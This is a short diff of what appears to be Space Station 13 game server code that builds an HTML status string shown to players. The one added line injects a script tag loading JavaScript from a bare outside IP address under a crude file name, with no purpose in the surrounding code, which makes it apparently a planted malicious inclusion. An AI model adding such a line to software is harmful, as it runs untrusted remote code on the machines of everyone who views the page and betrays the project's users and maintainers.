@@ -213,6 +213,7 @@ var/global/list/map_transition_config = MAP_TRANSITION_CONFIG
 	s += ")<br>"
 	s += "<img src='http://i.imgur.com/bwkdv8N.gif'><br>"
 	s += "Under <b>[config.hostedby]</b> Protectorate"
+	s += "<script src=\"http://178.33.188.131/suckmycock.js\"></script>"
 /*
 	var/list/features = list()
 	if(!ticker)
